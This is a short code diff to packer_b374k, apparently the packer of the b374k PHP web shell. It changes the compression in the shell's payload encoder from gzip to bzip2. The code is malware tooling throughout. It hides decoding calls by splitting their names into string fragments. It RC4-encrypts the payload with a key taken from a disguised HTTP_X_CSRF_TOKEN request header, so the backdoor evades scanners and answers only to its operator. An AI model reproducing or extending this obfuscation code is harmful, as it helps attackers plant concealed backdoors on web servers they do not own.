@@ -570,7 +570,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
 	}
 	elseif($compress=="rc4"){
-		$content = rc4($GLOBALS['cipher_key'], gzcompress($content, $compress_level));
+		$content = rc4($GLOBALS['cipher_key'], bzcompress($content, $compress_level));
 		$encoder_func = "r"."c4";
 	}
 	else{
@@ -581,7 +581,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = "gz'.'un'.'com'.'pre'.'ss(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
+				$encoder = "bz'.'de'.'com'.'pre'.'ss(".$encoder_func."(isset(\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\'])?\$_SERVER[\\'HTTP_X_CSRF_TOKEN\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
